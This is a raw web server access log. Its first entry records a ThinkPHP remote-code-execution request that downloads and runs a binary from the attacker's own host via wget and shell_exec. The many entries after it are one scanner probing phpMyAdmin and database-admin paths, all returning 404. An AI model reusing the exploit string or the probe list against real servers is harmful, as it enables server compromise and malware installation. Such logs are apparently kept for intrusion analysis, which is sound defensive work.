185.222.202.118 - - [16/Jan/2019:07:52:06 +0300] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.222.202.118/bins/rift.x86;cat%20rift.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 500 173043 "-" "python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-amd64"
219.111.95.113 - - [16/Jan/2019:07:54:16 +0300] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:16 +0300] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 221 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:17 +0300] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 224 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:17 +0300] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 226 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:17 +0300] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 218 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:17 +0300] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 218 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:18 +0300] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 218 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:18 +0300] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 218 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:18 +0300] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:18 +0300] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:19 +0300] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:19 +0300] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:19 +0300] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 257 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:19 +0300] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 213 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:20 +0300] "GET /phppma/index.php?lang=en HTTP/1.1" 404 214 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:20 +0300] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:20 +0300] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 214 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:20 +0300] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:21 +0300] "GET /program/index.php?lang=en HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:21 +0300] "GET /PMA/index.php?lang=en HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:21 +0300] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:22 +0300] "GET /pma/index.php?lang=en HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:22 +0300] "GET /db/index.php?lang=en HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:22 +0300] "GET /admin/index.php?lang=en HTTP/1.1" 404 213 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:22 +0300] "GET /mysql/index.php?lang=en HTTP/1.1" 404 213 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:23 +0300] "GET /database/index.php?lang=en HTTP/1.1" 404 216 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:23 +0300] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 221 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:23 +0300] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 221 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:23 +0300] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 218 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:24 +0300] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 220 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:24 +0300] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:24 +0300] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:24 +0300] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 218 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:25 +0300] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:25 +0300] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 224 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:25 +0300] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 224 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:25 +0300] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 222 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:26 +0300] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 222 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
219.111.95.113 - - [16/Jan/2019:07:54:26 +0300] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 216 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
